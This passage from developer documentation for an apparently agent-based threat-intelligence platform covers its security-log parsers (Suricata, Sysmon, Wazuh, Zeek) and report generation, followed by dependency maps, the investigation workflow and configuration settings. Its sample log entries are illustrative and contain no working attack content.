- Filters relevant alert events
- Provides structured event data
- Enables IDS integration

**Internal Workflow:**
```
EVE JSON File → Line-by-Line Parse → Alert Filter → Field Extraction → Event List
```

**Dependencies:**
- **Imports:** `json`, `typing`
- **Imported by:** Data ingestion scripts
- **Calls:** None (parser leaf node)

**Functions:**

#### `parse_suricata_eve(filepath: str) -> List[Dict]`
- **Input:** Path to EVE JSON file
- **Output:** List of event dictionaries
- **Purpose:** Parse Suricata EVE JSON alerts
- **Logic:**
  1. Read file line by line
  2. Parse each line as JSON
  3. Filter for event_type == "alert"
  4. Extract alert fields (signature, category, severity)
  5. Extract network fields (src_ip, dest_ip)
  6. Include raw entry
  7. Return event list
- **Why:** Normalizes Suricata alerts for platform
- **Fields:** source, timestamp, src_ip, dest_ip, signature, category, severity, raw

**Example:**
```python
events = parse_suricata_eve("/var/log/suricata/eve.json")
# Returns:
[
    {
        "source": "suricata",
        "timestamp": "2024-01-01T12:00:00Z",
        "src_ip": "192.168.1.1",
        "dest_ip": "10.0.0.1",
        "signature": "ET MALWARE C2 Traffic",
        "category": "Malware Command and Control",
        "severity": 1,
        "raw": {...}
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_parse_suricata_eve():
    events = parse_suricata_eve("test_eve.json")
    assert all(e["source"] == "suricata" for e in events)
    assert all("signature" in e for e in events)
```

**Manual Tests:**
```python
from telemetry.suricata_parser import parse_suricata_eve

events = parse_suricata_eve("data/sample_eve.json")
print(f"Parsed {len(events)} alerts")
```

**Expected Outputs:**
- List of alert events
- Suricata-specific fields extracted
- Non-alert events filtered

**Failure Cases:**
- Invalid JSON format
- Missing required fields
- File not found
- Permission errors

**Edge Cases:**
- Empty file
- Non-alert events (filtered)
- Malformed JSON lines
- Unicode in fields

**Interview Questions:**

**Q: Why filter only alert events?**
**A:** Noise reduction. Suricata EVE logs include flow, DNS, HTTP events that are informational. For threat intelligence, alerts are the primary concern. Filtering reduces noise and processing overhead.

**Q: Why include raw entry in output?**
**A:** Data preservation. Raw entry contains all original data for debugging and future analysis. Normalized fields are for convenience, raw is for completeness.

**Q: What happens if a line is not valid JSON?**
**A:** The JSONDecodeError will propagate. There's no error handling. This is a weak point. An improvement would be to skip invalid lines with a warning.

**Design Decisions:**

**Chosen Solution:** Line-by-line JSON parsing with alert filter
**Alternatives:**
- Load entire file: Simpler, memory intensive
- Use Suricata Python library: More features, external dependency
- CSV export: Simpler, less structured
- Database export: More scalable, more complex

**Advantages:**
- Memory efficient (line-by-line)
- Standard JSON format
- Alert filtering
- Raw data preservation
- Simple implementation

**Disadvantages:**
- No error handling
- No validation
- No field normalization
- No deduplication
- No timestamp parsing

**Weak Points:**
- No error handling for invalid lines
- No timestamp normalization
- No IP validation
- No deduplication
- No field validation

**Improvements:**
- Add error handling for invalid lines
- Implement timestamp normalization
- Add IP validation
- Add deduplication
- Add field validation
- Add statistics (total lines, alerts filtered)

---

### telemetry/sysmon_parser.py

**Purpose:**
- Parse Windows Sysmon events
- Support JSON and EVTX formats
- Convert to platform event format

**Why it exists:**
- Sysmon is standard Windows endpoint monitoring
- Multiple export formats (JSON, EVTX)
- Normalizes Sysmon events for analysis
- Enables Windows endpoint integration

**Problem it solves:**
- Converts Sysmon logs to platform format
- Handles multiple input formats
- Provides structured event data
- Enables Windows telemetry integration

**Internal Workflow:**
```
Sysmon File → Format Detection → Parse → Field Extraction → Event List
```

**Dependencies:**
- **Imports:** `json`, `typing`
- **Imported by:** Data ingestion scripts
- **Calls:** None (parser leaf node, optional python-evtx)

**Functions:**

#### `parse_sysmon_json(filepath: str) -> List[Dict]`
- **Input:** Path to Sysmon JSON file
- **Output:** List of event dictionaries
- **Purpose:** Parse Sysmon JSON events
- **Logic:**
  1. Read file content
  2. Try parse as JSON array or single object
  3. Fallback to JSON-lines if array parse fails
  4. Extract Sysmon fields (EventID, UtcTime, Computer, Image, CommandLine, User, SourceIp, DestinationIp)
  5. Include raw entry
  6. Return event list
- **Why:** Handles multiple JSON formats
- **Fields:** source, event_id, timestamp, host, process, command_line, user, src_ip, dest_ip, raw

#### `parse_sysmon_evtx(filepath: str) -> List[Dict]`
- **Input:** Path to Sysmon EVTX file
- **Output:** List of event dictionaries
- **Purpose:** Parse Sysmon EVTX files
- **Logic:**
  1. Import python-evtx (raises ImportError if not available)
  2. Open EVTX file
  3. Parse each record as XML
  4. Extract EventData fields
  5. Return event list
- **Why:** Support native Windows log format
- **Dependency:** python-evtx (optional)

**Example:**
```python
events = parse_sysmon_json("sysmon.json")
# Returns:
[
    {
        "source": "sysmon",
        "event_id": 1,
        "timestamp": "2024-01-01T12:00:00Z",
        "host": "WIN-SRV01",
        "process": "powershell.exe",
        "command_line": "powershell -EncodedCommand ...",
        "user": "SYSTEM",
        "raw": {...}
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_parse_sysmon_json():
    events = parse_sysmon_json("test_sysmon.json")
    assert all(e["source"] == "sysmon" for e in events)

def test_parse_sysmon_evtx():
    events = parse_sysmon_evtx("test_sysmon.evtx")
    assert all(e["source"] == "sysmon" for e in events)
```

**Manual Tests:**
```python
from telemetry.sysmon_parser import parse_sysmon_json

events = parse_sysmon_json("data/sample_sysmon.json")
print(f"Parsed {len(events)} Sysmon events")
```

**Expected Outputs:**
- List of Sysmon events
- Sysmon-specific fields extracted
- Multiple format support

**Failure Cases:**
- Invalid JSON format
- Missing python-evtx for EVTX
- File not found
- Permission errors

**Edge Cases:**
- Empty file
- Single event vs array
- Missing fields (uses None)
- Unicode in fields

**Interview Questions:**

**Q: Why support both JSON and EVTX formats?**
**A:** Flexibility. JSON is common from SIEM exports. EVTX is native Windows format. Supporting both enables integration with different data sources without conversion tools.

**Q: Why is python-evtx optional?**
**A:** Dependency management. python-evtx requires C compilation and can be difficult to install. Making it optional allows the parser to work with JSON without the dependency, while still supporting EVTX if available.

**Q: What happens if a field is missing in Sysmon event?**
**A:** The get() method returns None. This is safe but may cause issues downstream. An improvement would be to validate required fields or provide defaults.

**Design Decisions:**

**Chosen Solution:** Multi-format parser with optional EVTX support
**Alternatives:**
- JSON only: Simpler, less flexible
- EVTX only: Native format, less common
- Use Win32LogEventHash: More features, Windows-only
- Use wevtutil: Native tool, subprocess overhead

**Advantages:**
- Multiple format support
- Optional dependencies
- Standard JSON handling
- Raw data preservation
- Flexible字段 extraction

**Disadvantages:**
- Optional dependency complexity
- No field validation
- No error handling
- No deduplication
- EVTX parsing is slow

**Weak Points:**
- No field validation
- No error handling for malformed data
- No deduplication
- No timestamp normalization
- EVTX parsing is resource-intensive

**Improvements:**
- Add field validation
- Implement error handling
- Add deduplication
- Add timestamp normalization
- Add progress reporting for large EVTX files
- Add parallel processing for EVTX

---

### telemetry/wazuh_parser.py

**Purpose:**
- Parse Wazuh SIEM alert exports
- Convert to platform event format
- Extract rule and agent information

**Why it exists:**
- Wazuh is popular SIEM/EDR
- JSON alert format is standard
- Normalizes Wazuh events for analysis
- Enables SIEM integration

**Problem it solves:**
- Converts Wazuh alerts to platform format
- Extracts rule and agent context
- Provides structured event data
- Enables SIEM integration

**Internal Workflow:**
```
Wazuh JSON File → Parse → Extract Rule/Agent Fields → Event List
```

**Dependencies:**
- **Imports:** `json`, `typing`
- **Imported by:** Data ingestion scripts
- **Calls:** None (parser leaf node)

**Functions:**

#### `parse_wazuh_alerts(filepath: str) -> List[Dict]`
- **Input:** Path to Wazuh JSON file
- **Output:** List of event dictionaries
- **Purpose:** Parse Wazuh alert events
- **Logic:**
  1. Read file content
  2. Try parse as JSON array or single object
  3. Fallback to JSON-lines if array parse fails
  4. Extract rule fields (description, level, groups)
  5. Extract agent fields (name)
  6. Include raw entry
  7. Return event list
- **Why:** Normalizes Wazuh alerts for platform
- **Fields:** source, timestamp, host, rule_description, rule_level, rule_groups, raw

**Example:**
```python
events = parse_wazuh_alerts("wazuh_alerts.json")
# Returns:
[
    {
        "source": "wazuh",
        "timestamp": "2024-01-01T12:00:00Z",
        "host": "linux-srv01",
        "rule_description": "SSH login attempt",
        "rule_level": 5,
        "rule_groups": ["authentication", "ssh"],
        "raw": {...}
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_parse_wazuh_alerts():
    events = parse_wazuh_alerts("test_wazuh.json")
    assert all(e["source"] == "wazuh" for e in events)
    assert all("rule_description" in e for e in events)
```

**Manual Tests:**
```python
from telemetry.wazuh_parser import parse_wazuh_alerts

events = parse_wazuh_alerts("data/sample_wazuh.json")
print(f"Parsed {len(events)} Wazuh alerts")
```

**Expected Outputs:**
- List of Wazuh alert events
- Rule and agent fields extracted
- Multiple format support

**Failure Cases:**
- Invalid JSON format
- Missing required fields
- File not found
- Permission errors

**Edge Cases:**
- Empty file
- Single event vs array
- Missing rule or agent data
- Unicode in fields

**Interview Questions:**

**Q: Why extract rule level and groups?**
**A:** Prioritization and classification. Rule level indicates severity. Groups indicate attack category. These fields are critical for threat analysis and response prioritization.

**Q: Why include raw entry in output?**
**A:** Data preservation. Wazuh alerts contain rich metadata beyond the extracted fields. Raw entry preserves this for debugging and future analysis.

**Q: What happens if rule or agent data is missing?**
**A:** The get() method returns None or empty dict. This is safe but may cause issues downstream. An improvement would be to validate required fields.

**Design Decisions:**

**Chosen Solution:** JSON parser with rule/agent extraction
**Alternatives:**
- Use Wazuh API: Real-time, requires authentication
- Use Wazuh Python SDK: More features, external dependency
- CSV export: Simpler, less structured
- Database export: More scalable, more complex

**Advantages:**
- Simple implementation
- Standard JSON format
- Rule and agent context
- Raw data preservation
- Multiple format support

**Disadvantages:**
- No field validation
- No error handling
- No deduplication
- No timestamp normalization
- Limited to file-based input

**Weak Points:**
- No field validation
- No error handling for malformed data
- No deduplication
- No timestamp normalization
- No real-time support

**Improvements:**
- Add field validation
- Implement error handling
- Add deduplication
- Add timestamp normalization
- Add Wazuh API integration for real-time
- Add rule level categorization

---

### telemetry/zeek_parser.py

**Purpose:**
- Parse Zeek (Bro) network logs
- Support JSON log format
- Provide network context for analysis

**Why it exists:**
- Zeek is standard network monitoring
- JSON logs are easy to parse
- Provides network context
- Enables network telemetry integration

**Problem it solves:**
- Converts Zeek logs to platform format
- Provides network context (IPs, protocols, services)
- Enables network-based analysis
- Supports network telemetry integration

**Internal Workflow:**
```
Zeek JSON File → Line-by-Line Parse → Field Extraction → Event List
```

**Dependencies:**
- **Imports:** `json`, `typing`
- **Imported by:** Data ingestion scripts
- **Calls:** None (parser leaf node)

**Functions:**

#### `parse_zeek_json_log(filepath: str) -> List[Dict]`
- **Input:** Path to Zeek JSON log file
- **Output:** List of event dictionaries
- **Purpose:** Parse Zeek JSON network logs
- **Logic:**
  1. Read file line by line
  2. Parse each line as JSON
  3. Extract network fields (ts, id.orig_h, id.resp_h, proto, service, query)
  4. Include raw entry
  5. Return event list
- **Why:** Normalizes Zeek logs for platform
- **Fields:** source, timestamp, src_ip, dest_ip, proto, service, query, raw

**Example:**
```python
events = parse_zeek_json_log("zeek_conn.log")
# Returns:
[
    {
        "source": "zeek",
        "timestamp": "2024-01-01T12:00:00Z",
        "src_ip": "192.168.1.1",
        "dest_ip": "8.8.8.8",
        "proto": "tcp",
        "service": "dns",
        "query": "example.com",
        "raw": {...}
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_parse_zeek_json_log():
    events = parse_zeek_json_log("test_zeek.log")
    assert all(e["source"] == "zeek" for e in events)
    assert all("src_ip" in e for e in events)
```

**Manual Tests:**
```python
from telemetry.zeek_parser import parse_zeek_json_log

events = parse_zeek_json_log("data/sample_zeek.log")
print(f"Parsed {len(events)} Zeek events")
```

**Expected Outputs:**
- List of Zeek network events
- Network fields extracted
- Connection and DNS context

**Failure Cases:**
- Invalid JSON format
- Missing required fields
- File not found
- Permission errors

**Edge Cases:**
- Empty file
- Different log types (conn.log, dns.log)
- Missing query field (conn.log)
- Unicode in fields

**Interview Questions:**

**Q: Why parse Zeek logs instead of just using raw logs?**
**A:** Normalization. Zeek logs have specific field names (id.orig_h, id.resp_h). Normalizing to src_ip, dest_ip makes them consistent with other telemetry sources and easier to analyze.

**Q: Why include query field?**
**A:** DNS context. The query field contains DNS queries from dns.log. This is valuable for identifying malicious domains and C2 infrastructure.

**Q: What happens if the log type doesn't have a query field?**
**A:** The get() method returns None. This is safe for conn.log which doesn't have query. The parser handles both log types gracefully.

**Design Decisions:**

**Chosen Solution:** Line-by-line JSON parser with network field extraction
**Alternatives:**
- Use Zeek Python package: More features, external dependency
- Use TSV parser: Native format, more complex
- Use Zeek API: Real-time, requires Zeek installation
- Use Zeek Broker: Real-time, complex

**Advantages:**
- Simple implementation
- Standard JSON format
- Network context preservation
- Multiple log type support
- Memory efficient

**Disadvantages:**
- No field validation
- No error handling
- No deduplication
- No log type detection
- Limited to JSON format

**Weak Points:**
- No field validation
- No error handling for malformed lines
- No deduplication
- No log type detection
- No timestamp normalization

**Improvements:**
- Add field validation
- Implement error handling
- Add deduplication
- Add log type detection
- Add timestamp normalization
- Add support for TSV format
- Add statistics (total lines, log type)

---

## Report Generation

### reports/markdown_templates.py

**Purpose:**
- Define Jinja2 templates for report formatting
- Provide consistent report structure
- Enable dynamic report generation

**Why it exists:**
- Consistent report formatting
- Template-based generation
- Separates presentation from content
- Enables report customization

**Problem it solves:**
- Provides structured report format
- Enables dynamic content insertion
- Standardizes report layout
- Separates concerns

**Internal Workflow:**
```
Template Definition → Variable Substitution → Rendered Report
```

**Dependencies:**
- **Imports:** `jinja2.Template`
- **Imported by:** `reports.report_generator`
- **Calls:** None (templates leaf node)

**Global Variables:**

#### `REPORT_TEMPLATE`
- **Type:** Jinja2 Template
- **Purpose:** Markdown report template
- **Fields:** campaign_name, campaign_id, generated_at, body
- **Why:** Standardizes report structure

**Functions:**

#### `render_report(body: str, campaign_name: str, campaign_id: str, generated_at: str) -> str`
- **Input:** Report body, campaign metadata
- **Output:** Rendered markdown string
- **Purpose:** Render report with template
- **Logic:**
  1. Call template.render with variables
  2. Return rendered string
- **Why:** Separates template from data

**Example:**
```python
report = render_report(
    body="## Analysis\nMalicious activity detected...",
    campaign_name="PowerShell C2",
    campaign_id="uuid-123",
    generated_at="2024-01-01T12:00:00Z"
)
# Returns:
# # Threat Intelligence Report
#
# **Campaign:** PowerShell C2
# **Campaign ID:** uuid-123
# **Generated:** 2024-01-01T12:00:00Z
#
# ---
#
# ## Analysis
# Malicious activity detected...
```

**Testing:**

**Unit Tests:**
```python
def test_render_report():
    report = render_report("Test body", "Test Campaign", "test-123", "2024-01-01")
    assert "Test Campaign" in report
    assert "test-123" in report
    assert "Test body" in report
```

**Manual Tests:**
```python
from reports.markdown_templates import render_report

report = render_report("Test", "Campaign", "123", "2024-01-01")
print(report)
```

**Expected Outputs:**
- Formatted markdown report
- Metadata header
- Body content

**Failure Cases:**
- Invalid template syntax
- Missing variables
- Template rendering errors

**Edge Cases:**
- Empty body
- Very long body
- Unicode in fields
- Markdown in body

**Interview Questions:**

**Q: Why use Jinja2 instead of string formatting?**
**A:** Flexibility and safety. Jinja2 provides template inheritance, filters, and automatic escaping. String formatting is error-prone and less maintainable for complex templates.

**Q: Why separate templates from generator?**
**A:** Separation of concerns. Templates define presentation, generator defines file I/O logic. This makes it easier to modify formatting without changing logic.

**Q: What happens if a variable is missing?**
**A:** Jinja2 will raise an UndefinedError. This is intentional to catch missing data. An improvement would be to provide default values.

**Design Decisions:**

**Chosen Solution:** Jinja2 templates with simple structure
**Alternatives:**
- String formatting: Simpler, less flexible
- f-strings: Python-only, less maintainable
- External template engine: More features, external dependency
- Custom template system: More control, more code

**Advantages:**
- Template inheritance
- Automatic escaping
- Filters and extensions
- Separation of concerns
- Industry standard

**Disadvantages:**
- Additional dependency
- Learning curve
- Slight overhead
- Template syntax to learn

**Weak Points:**
- No template validation
- No template versioning
- No template testing
- No template caching
- Limited to markdown

**Improvements:**
- Add template validation
- Implement template versioning
- Add template testing framework
- Add template caching
- Add HTML template option
- Add PDF generation
- Add custom filters

---

### reports/report_generator.py

**Purpose:**
- Save generated reports to files
- Apply markdown templates
- Manage report output directory

**Why it exists:**
- Persistent report storage
- Consistent file naming
- Directory management
- Template application

**Problem it solves:**
- Saves reports to disk
- Applies consistent formatting
- Manages output directory
- Provides file paths

**Internal Workflow:**
```
Report Body + Campaign → Template Render → Directory Creation → File Write → Return Path
```

**Dependencies:**
- **Imports:** `os`, `datetime`, `typing`, `config`, `reports.markdown_templates`
- **Imported by:** `agents.reporting_agent`
- **Calls:** `render_report()`

**Functions:**

#### `save_report(body: str, campaign: Dict) -> str`
- **Input:** Report body string, campaign dictionary
- **Output:** File path string
- **Purpose:** Save report to file
- **Logic:**
  1. Create output directory if needed
  2. Extract campaign_id and name
  3. Get current timestamp
  4. Render report with template
  5. Generate filename: report_{campaign_id}.md
  6. Write file to output directory
  7. Return file path
- **Why:** Persistent report storage with consistent naming
- **Filename Pattern:** report_{campaign_id}.md

**Example:**
```python
campaign = {"campaign_id": "uuid-123", "name": "PowerShell C2"}
filepath = save_report("## Analysis\nMalicious activity...", campaign)
# Returns: "./reports/generated_reports/report_uuid-123.md"
```

**Testing:**

**Unit Tests:**
```python
def test_save_report():
    campaign = {"campaign_id": "test-123", "name": "Test"}
    filepath = save_report("Test body", campaign)
    assert os.path.exists(filepath)
    assert "test-123" in filepath
```

**Manual Tests:**
```python
from reports.report_generator import save_report

campaign = {"campaign_id": "test-123", "name": "Test Campaign"}
filepath = save_report("## Test Report", campaign)
print(f"Report saved to: {filepath}")
```

**Expected Outputs:**
- Markdown file created
- File path returned
- Consistent naming

**Failure Cases:**
- Directory creation failure
- File write permission errors
- Invalid campaign data
- Template rendering errors

**Edge Cases:**
- Empty body
- Missing campaign_id
- Unicode in content
- Very long reports

**Interview Questions:**

**Q: Why use campaign_id in filename instead of timestamp?**
**A:** Idempotency. Using campaign_id ensures the same campaign overwrites the same file. Timestamps would create new files for each save, leading to duplicates.

**Q: Why create directory if it doesn't exist?**
**A:** Convenience. Auto-creating the output directory prevents errors on first run. It's a common pattern for file output utilities.

**Q: What happens if the file already exists?**
**A:** It's overwritten. This is intentional for idempotency. An improvement would be to add versioning or append mode.

**Design Decisions:**

**Chosen Solution:** File-based storage with template rendering
**Alternatives:**
- Database storage: More scalable, more complex
- Return string only: Simpler, no persistence
- PDF generation: More polished, more complex
- HTML output: More flexible, more complex

**Advantages:**
- Simple implementation
- Human-readable output
- Persistent storage
- Consistent naming
- Template-based formatting

**Disadvantages:**
- File-based (not scalable)
- No versioning
- No compression
- No encryption
- Limited to markdown

**Weak Points:**
- No file versioning
- No backup mechanism
- No compression
- No encryption
- No report indexing
- No search capability

**Improvements:**
- Add file versioning
- Implement backup mechanism
- Add compression
- Add encryption for sensitive reports
- Add report indexing
- Add search capability
- Add PDF generation option
- Add HTML generation option

---

## Dependency Map and Execution Tree

### Module Dependency Graph

```
Entry Points:
├── app.py
│   ├── investigation_service.py
│   ├── config.py
│   └── graph/workflow.py
│
└── main.py
    ├── investigation_service.py
    ├── config.py
    └── graph/workflow.py

Core Orchestration:
├── graph/workflow.py
│   ├── graph/state.py
│   ├── graph/nodes.py
│   └── All agents/
│
├── investigation_service.py
│   ├── config.py
│   ├── graph/workflow.py
│   └── memory/investigation_memory.py
│
└── config.py (leaf node - no internal dependencies)

AI Agents (agents/):
├── collection_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   └── llm/output_parsers.py
│
├── enrichment_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   ├── rag/retriever.py
│   ├── rag/cve_retriever.py
│   └── intelligence/ioc_extractor.py
│
├── vulnerability_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   └── rag/cve_retriever.py
│
├── attack_mapping_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   └── rag/retriever.py
│
├── correlation_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   ├── knowledge_graph/graph_builder.py
│   └── intelligence/campaign_builder.py
│
├── prediction_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   └── rag/attack_chain_retriever.py
│
├── reporting_agent.py
│   ├── llm/groq_client.py
│   ├── llm/prompts.py
│   ├── llm/output_parsers.py
│   └── reports/report_generator.py
│
└── response_agent.py
    ├── llm/groq_client.py
    ├── llm/prompts.py
    ├── llm/output_parsers.py
    ├── actions/policy.py
    ├── actions/connectors.py
    ├── actions/audit_log.py
    └── actions/action_models.py

LLM Integration (llm/):
├── groq_client.py
│   ├── langchain_groq.ChatGroq
│   └── config.py
│
├── prompts.py (leaf node - constants only)
│
└── output_parsers.py (leaf node - utility functions)

RAG Implementation (rag/):
├── vector_store.py
│   ├── chromadb
│   ├── config.py
│   └── rag/embeddings.py
│
├── embeddings.py
│   ├── sentence_transformers.SentenceTransformer
│   └── config.py
│
├── chunking.py (leaf node - utility functions)
│
├── retriever.py
│   └── rag/vector_store.py
│
├── cve_retriever.py
│   └── rag/vector_store.py
│
├── attack_chain_retriever.py
│   └── rag/vector_store.py
│
├── ingest_attack.py
│   ├── config.py
│   ├── rag/chunking.py
│   ├── rag/embeddings.py
│   └── rag/vector_store.py
│
└── ingest_cve.py
    ├── config.py
    ├── rag/chunking.py
    ├── rag/embeddings.py
    └── rag/vector_store.py

Intelligence Logic (intelligence/):
├── ioc_extractor.py (leaf node - regex only)
├── mitre_mapper.py
│   ├── config.py
│   └── rag/ingest_attack.py
├── risk_scoring.py (leaf node - utility function)
├── campaign_builder.py
│   └── intelligence/risk_scoring.py
└── technique_predictor.py
    └── intelligence/mitre_mapper.py

Knowledge Graph (knowledge_graph/):
├── graph_builder.py
│   └── databases/neo4j_manager.py
│
├── graph_queries.py
│   └── databases/neo4j_manager.py
│
└── graph_schema.py (leaf node - constants)

Database Managers (databases/):
├── neo4j_manager.py
│   ├── neo4j.GraphDatabase
│   └── config.py
│
├── chroma_manager.py
│   ├── chromadb
│   └── config.py
│
└── models.py (leaf node - Pydantic models)

Action System (actions/):
├── action_models.py
│   ├── pydantic
│   └── enum
│
├── policy.py
│   ├── config.py
│   └── actions/action_models.py
│
├── connectors.py
│   ├── config.py
│   └── requests
│
├── audit_log.py
│   ├── actions/action_models.py
│   └── pathlib.Path
│
└── review_pending.py
    ├── actions/audit_log.py
    └── actions/connectors.py

Memory System (memory/):
└── investigation_memory.py
    ├── json
    └── os

Telemetry Parsers (telemetry/):
├── suricata_parser.py (leaf node - json only)
├── sysmon_parser.py (leaf node - json, optional python-evtx)
├── wazuh_parser.py (leaf node - json only)
└── zeek_parser.py (leaf node - json only)

Report Generation (reports/):
├── report_generator.py
│   ├── config.py
│   ├── reports/markdown_templates.py
│   └── os
│
└── markdown_templates.py
    └── jinja2.Template
```

### Execution Tree (Investigation Workflow)

```
1. Entry Point (app.py or main.py)
   ↓
2. Load Events (investigation_service.load_events)
   ↓
3. Initialize Investigation State (graph/state.new_investigation_state)
   ↓
4. Invoke LangGraph Workflow (graph/workflow.get_workflow().invoke)
   ↓
   ┌─────────────────────────────────────────────────────────────┐
   │ LangGraph Sequential Execution                              │
   ├─────────────────────────────────────────────────────────────┤
   │                                                             │
   │ 5. Collection Agent                                         │
   │    - Invoke LLM with event data                            │
   │    - Parse JSON response                                   │
   │    - Return normalized events                               │
   │    ↓                                                        │
   │ 6. Enrichment Agent                                        │
   │    - Extract IOCs (ioc_extractor)                          │
   │    - Retrieve CVEs (cve_retriever)                         │
   │    - Enrich IOCs with LLM                                  │
   │    - Return enriched events                                │
   │    ↓                                                        │
   │ 7. Vulnerability Agent                                     │
   │    - Identify software from events                         │
   │    - Retrieve CVEs (cve_retriever)                         │
   │    - Analyze vulnerabilities with LLM                       │
   │    - Return vulnerability list                             │
   │    ↓                                                        │
   │ 8. Attack Mapping Agent                                    │
   │    - For each event:                                       │
   │      - Retrieve ATT&CK context (retriever)                 │
   │      - Map to techniques with LLM                           │
   │    - Return technique mappings                             │
   │    ↓                                                        │
   │ 9. Correlation Agent                                       │
   │    - Group events into campaigns (campaign_builder)        │
   │    - Score campaign risk (risk_scoring)                     │
   │    - Persist to Neo4j (graph_builder)                       │
   │    - Return campaign                                       │
   │    ↓                                                        │
   │ 10. Prediction Agent                                       │
   │     - Retrieve attack chain (attack_chain_retriever)       │
   │     - Predict next techniques with LLM                      │
   │     - Return predictions                                   │
   │     ↓                                                        │
   │ 11. Reporting Agent                                        │
   │     - Compile all analysis results                         │
   │     - Generate markdown report with LLM                     │
   │     - Save report to file (report_generator)               │
   │     - Return report                                        │
   │     ↓                                                        │
   │ 12. Response Agent                                         │
   │     - Generate proposed actions with LLM                    │
   │     - For each action:                                      │
   │       - Evaluate policy (policy.evaluate)                   │
   │       - If auto_execute: call connector (connectors)        │
   │       - Record action (audit_log.record)                    │
   │     - Return action results                                │
   │                                                             │
   └─────────────────────────────────────────────────────────────┘
   ↓
13. Save Investigation State (investigation_memory.save)
   ↓
14. Return Final State
```

### Data Flow Diagram

```
Raw Events (JSON/JSONL)
    ↓
Collection Agent → Normalized Events
    ↓
Enrichment Agent → IOCs + CVEs
    ↓
Vulnerability Agent → Vulnerability List
    ↓
Attack Mapping Agent → Technique Mappings
    ↓
Correlation Agent → Campaign + Risk Score
    ↓
Prediction Agent → Next Technique Predictions
    ↓
Reporting Agent → Markdown Report
    ↓
Response Agent → Action Results
    ↓
Final State (JSON)
```

### External Dependencies

```
Python Packages:
├── langchain (LangGraph, LangChain)
├── langchain-groq (Groq LLM integration)
├── langchain-community (LangChain integrations)
├── chromadb (Vector database)
├── sentence-transformers (Embeddings)
├── neo4j (Graph database driver)
├── pydantic (Data validation)
├── jinja2 (Templates)
├── requests (HTTP client)
└── python-evtx (Optional: Sysmon EVTX parsing)

External Services:
├── Groq API (LLM inference)
├── Neo4j (Knowledge graph storage)
├── Firewall API (IP blocking)
├── Wazuh API (Host isolation, process killing)
├── Azure AD API (Account disabling)
├── Okta API (Account disabling)
├── CrowdStrike API (File quarantine)
├── SentinelOne API (File quarantine)
└── Slack Webhook (Notifications)
```

### Component Interaction Matrix

| Component | Calls | Called By |
|-----------|-------|----------|
| app.py | investigation_service, config | N/A (entry point) |
| main.py | investigation_service, config | N/A (entry point) |
| investigation_service | graph/workflow, memory | app.py, main.py |
| config.py | N/A | All modules |
| graph/workflow | All agents, graph/state | investigation_service |
| graph/state | N/A | graph/workflow, agents |
| graph/nodes | All agents, llm, rag, intelligence, actions | graph/workflow |
| agents/* | llm, rag, intelligence, knowledge_graph, actions, reports | graph/nodes |
| llm/groq_client | langchain-groq, config | All agents |
| llm/prompts | N/A | All agents |
| llm/output_parsers | N/A | All agents |
| rag/vector_store | chromadb, config, rag/embeddings | rag/*, agents |
| rag/embeddings | sentence-transformers, config | rag/vector_store |
| rag/chunking | N/A | rag/ingest_* |
| rag/retriever | rag/vector_store | agents |
| rag/cve_retriever | rag/vector_store | agents |
| rag/attack_chain_retriever | rag/vector_store | agents |
| rag/ingest_attack | config, rag/chunking, rag/embeddings, rag/vector_store | Data ingestion |
| rag/ingest_cve | config, rag/chunking, rag/embeddings, rag/vector_store | Data ingestion |
| intelligence/ioc_extractor | N/A | agents |
| intelligence/mitre_mapper | config, rag/ingest_attack | agents, intelligence |
| intelligence/risk_scoring | N/A | agents, intelligence |
| intelligence/campaign_builder | intelligence/risk_scoring | agents |
| intelligence/technique_predictor | intelligence/mitre_mapper | agents |
| knowledge_graph/graph_builder | databases/neo4j_manager | agents |
| knowledge_graph/graph_queries | databases/neo4j_manager | Queries |
| knowledge_graph/graph_schema | N/A | Schema definition |
| databases/neo4j_manager | neo4j, config | knowledge_graph |
| databases/chroma_manager | chromadb, config | ChromaDB wrapper |
| databases/models | pydantic | Data models |
| actions/action_models | pydantic, enum | actions/* |
| actions/policy | config, actions/action_models | agents |
| actions/connectors | config, requests | agents |
| actions/audit_log | actions/action_models | agents |
| actions/review_pending | actions/audit_log, actions/connectors | Manual review |
| memory/investigation_memory | json, os | investigation_service |
| telemetry/* | json | Data ingestion |
| reports/report_generator | config, reports/markdown_templates | agents |
| reports/markdown_templates | jinja2 | reports/report_generator |

### Critical Path Analysis

**Critical Path for Investigation:**
1. Entry point → investigation_service
2. investigation_service → graph/workflow
3. graph/workflow → agents (sequential)
4. agents → llm/groq_client (external API)
5. agents → rag/vector_store (ChromaDB)
6. agents → knowledge_graph/graph_builder → databases/neo4j_manager
7. agents → actions/connectors (external APIs)
8. investigation_service → memory/investigation_memory

**Bottlenecks:**
- LLM API calls (sequential, network latency)
- Vector similarity search (ChromaDB query)
- Neo4j graph operations
- External connector API calls

**Parallel Opportunities:**
- Multiple agent LLM calls (currently sequential in LangGraph)
- Vector embeddings (batch processing)
- Multiple connector API calls (currently sequential)

### Configuration Dependencies

```
Required for All Modes:
├── GROQ_API_KEY (LLM access)

Required for RAG:
├── CHROMA_PERSIST_DIR
├── EMBEDDING_MODEL
└── ATTACK_DATA_PATH

Required for Knowledge Graph:
├── NEO4J_URI
├── NEO4J_USER
└── NEO4J_PASSWORD

Required for Auto-Response:
├── AUTO_RESPONSE_ENABLED=true
├── SLACK_WEBHOOK_URL
├── FIREWALL_API_URL
├── FIREWALL_API_TOKEN
├── WAZUH_API_URL
├── WAZUH_USERNAME
└── WAZUH_PASSWORD

Optional Connectors:
├── Azure AD: AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_TENANT_ID
├── Okta: OKTA_DOMAIN, OKTA_API_TOKEN
├── CrowdStrike: CROWDSTRIKE_API_URL, CROWDSTRIKE_CLIENT_ID, CROWDSTRIKE_CLIENT_SECRET
